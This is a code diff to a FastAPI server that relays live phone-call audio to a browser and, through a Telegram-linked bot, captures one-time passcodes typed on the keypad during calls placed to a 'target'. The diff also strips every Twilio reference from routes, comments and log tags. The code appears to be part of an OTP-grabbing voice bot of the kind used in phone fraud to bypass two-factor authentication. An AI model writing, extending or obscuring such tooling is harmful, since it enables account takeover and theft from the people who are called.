@@ -5,16 +5,15 @@ FastAPI server that mounts the Flask bot app and provides the Live Listen
 streaming endpoints on a single public port:
 
 - WebSocket for browser clients:      `/ws/live?call_id=...`
-- WebSocket for Twilio Media Streams: `/twilio/media`
+- WebSocket for live call audio:      `/media`
 - Browser UI:                         `/live?call_id=...`
 - Bootstrap endpoint:                 `/conversation/start`
 - Health checks:                      `/health`, `/`
 
 The Flask bot app (webhooks, Telegram, status/recording callbacks) is mounted
 at the root via a WSGI middleware, so all existing bot routes keep working on
-the same port (e.g. 5000 behind ngrok). The media stream for live listen is
-forked by an extra unidirectional ``<Start><Stream>`` injected into the Vapi
-bridge TwiML (see services/vapi_service.py).
+the same port (e.g. 5000 behind ngrok). The live-call audio fork that feeds
+the media WebSocket is provided by the telephony provider in use.
 """
 import asyncio
 import base64
@@ -38,7 +37,7 @@ app = FastAPI(title="Live Listen + Bot Bridge", docs_url=None, redoc_url=None)
 
 # ======================================================================
 # µ-law (8-bit, 8000 Hz) -> linear PCM16 conversion
-# Twilio Media Streams deliver audio as `audio/x-mulaw`; the browser UI
+# Live-call media streams deliver audio as `audio/x-mulaw`; the browser UI
 # (live.html) renders raw PCM16 (16-bit little-endian, 8000 Hz mono), so we
 # decode here before relaying to clients.
 # ======================================================================
@@ -70,11 +69,11 @@ def ulaw_to_pcm16(payload: bytes) -> bytes:
 # ======================================================================
 # Two-track mixer for `track="both_tracks"`.
 #
-# Twilio's unidirectional `<Start><Stream>` fork emits inbound AND outbound
-# media events every ~20 ms. Relaying both to the browser separately makes
-# it play at 2x speed with both sides overlapped (garbled noise). Instead we
-# pair the inbound/outbound frames that share the same presentation-time
-# slot, sum them into a single normal-speed PCM16 frame, and broadcast that.
+# A two-track media fork emits inbound AND outbound media events every ~20 ms.
+# Relaying both to the browser separately makes it play at 2x speed with both
+# sides overlapped (garbled noise). Instead we pair the inbound/outbound frames
+# that share the same presentation-time slot, sum them into a single
+# normal-speed PCM16 frame, and broadcast that.
 # ======================================================================
 _MIX_SLOT_MS = 20
 _MIX_STATE: dict = {}  # call_sid -> {slot_ms: {"samples": list[int], "tracks": set}}
@@ -230,14 +229,15 @@ async def conversation_start(request: Request):
 
 
 # ======================================================================
-# Twilio Media Stream WebSocket: /twilio/media
+# Live-call audio WebSocket: /media
 #
-# This endpoint receives the call audio that Twilio forks via the
-# unidirectional `<Start><Stream>` injected into the bridge TwiML. It relays
-# the decoded audio to any browser client connected on /ws/live.
+# This endpoint receives the call audio forked by the telephony provider's
+# media stream and relays the decoded audio to any browser client connected
+# on /ws/live. The stream protocol is the standard media-stream envelope:
+# start / media / stop events with base64-encoded audio payloads.
 # ======================================================================
-@app.websocket("/twilio/media")
-async def twilio_media(ws: WebSocket):
+@app.websocket("/media")
+async def media_socket(ws: WebSocket):
     subprotocol = None
     try:
         subprotocol_header = ws.headers.get("sec-websocket-protocol")
@@ -251,10 +251,10 @@ async def twilio_media(ws: WebSocket):
         else:
             await ws.accept()
     except Exception as e:
-        logger.error("[TWILIO_MEDIA_ACCEPT_ERROR] %s", e)
+        logger.error("[MEDIA_ACCEPT_ERROR] %s", e)
         return
 
-    logger.info("[TWILIO_MEDIA_CONNECT] client=%s subprotocol=%s", ws.client, subprotocol)
+    logger.info("[MEDIA_CONNECT] client=%s subprotocol=%s", ws.client, subprotocol)
     call_sid = None
     try:
         while True:
@@ -262,7 +262,7 @@ async def twilio_media(ws: WebSocket):
             try:
                 data = json.loads(msg)
             except Exception as e:
-                logger.error("[TWILIO_MEDIA_JSON_ERROR] %s", e)
+                logger.error("[MEDIA_JSON_ERROR] %s", e)
                 continue
 
             event = data.get("event")
@@ -272,7 +272,7 @@ async def twilio_media(ws: WebSocket):
                 call_sid = start.get("callSid")
                 tracks = start.get("tracks") or []
                 logger.info(
-                    "[TWILIO_MEDIA_START] call_sid=%s stream_sid=%s tracks=%s",
+                    "[MEDIA_START] call_sid=%s stream_sid=%s tracks=%s",
                     call_sid,
                     start.get("streamSid"),
                     tracks,
@@ -295,27 +295,27 @@ async def twilio_media(ws: WebSocket):
                                 call_sid, mixed, sequence=media.get("chunk")
                             )
                     except Exception as e:
-                        logger.error("[TWILIO_MEDIA_RELAY_ERROR] call_sid=%s error=%s", call_sid, e)
+                        logger.error("[MEDIA_RELAY_ERROR] call_sid=%s error=%s", call_sid, e)
 
             elif event == "dtmf":
                 digit = (data.get("dtmf") or {}).get("digit")
                 if digit and call_sid:
                     code = await manager.feed_dtmf(call_sid, digit)
-                    logger.info("[TWILIO_DTMF] call_sid=%s digit=%s buffer=%s",
+                    logger.info("[LIVE_DTMF] call_sid=%s digit=%s buffer=%s",
                                 call_sid, digit, manager.sessions.get(call_sid).dtmf_buffer if manager.sessions.get(call_sid) else "?")
                     if code:
                         await _notify_otp_from_dtmf(call_sid, code)
 
             elif event == "stop":
-                logger.info("[TWILIO_MEDIA_STOP] call_sid=%s", call_sid)
+                logger.info("[MEDIA_STOP] call_sid=%s", call_sid)
                 if call_sid:
                     await manager.set_state(call_sid, "completed")
                     _clear_mix_state(call_sid)
                 break
     except WebSocketDisconnect:
-        logger.info("[TWILIO_MEDIA_DISCONNECT] call_sid=%s", call_sid)
+        logger.info("[MEDIA_DISCONNECT] call_sid=%s", call_sid)
     except Exception as e:
-        logger.error("[TWILIO_MEDIA_ERROR] call_sid=%s error=%s", call_sid, e)
+        logger.error("[MEDIA_ERROR] call_sid=%s error=%s", call_sid, e)
     finally:
         if call_sid:
             _clear_mix_state(call_sid)
@@ -323,22 +323,22 @@ async def twilio_media(ws: WebSocket):
 
 
 # ======================================================================
-# Twilio-side OTP capture via DTMF
+# OTP capture via DTMF
 #
 # When the target's IVR plays an OTP, the caller types it on the keypad.
-# Twilio Media Streams deliver those key presses to this socket as `dtmf`
+# The media stream delivers those key presses to this socket as `dtmf`
 # events, so we can notify Telegram without relying on Vapi webhooks.
 # ======================================================================
 async def _notify_otp_from_dtmf(call_sid: str, digits: str):
     s = manager.sessions.get(call_sid)
     chat_id = getattr(s, "chat_id", None) if s else None
     if s and s.otp_notified:
-        logger.info("[TWILIO_DTMF] OTP already notified for call_sid=%s, skipping", call_sid)
+        logger.info("[LIVE_DTMF] OTP already notified for call_sid=%s, skipping", call_sid)
         return
     if not chat_id:
-        logger.warning("[TWILIO_DTMF] no chat_id for call_sid=%s — OTP %s captured but nothing to notify", call_sid, digits)
+        logger.warning("[LIVE_DTMF] no chat_id for call_sid=%s — OTP %s captured but nothing to notify", call_sid, digits)
         return
-    logger.info("[TWILIO_DTMF_OTP] code=%s call_sid=%s chat_id=%s", digits, call_sid, chat_id)
+    logger.info("[LIVE_DTMF_OTP] code=%s call_sid=%s chat_id=%s", digits, call_sid, chat_id)
     if s:
         s.otp_notified = True
 
@@ -347,7 +347,7 @@ async def _notify_otp_from_dtmf(call_sid: str, digits: str):
             from handlers.otp_notifier import notify_otp_captured
             notify_otp_captured(int(chat_id), call_sid, digits)
         except Exception as e:
-            logger.error("[TWILIO_DTMF_NOTIFY_ERROR] call_sid=%s error=%s", call_sid, e)
+            logger.error("[LIVE_DTMF_NOTIFY_ERROR] call_sid=%s error=%s", call_sid, e)
 
     import threading
     threading.Thread(target=_notify, daemon=True).start()
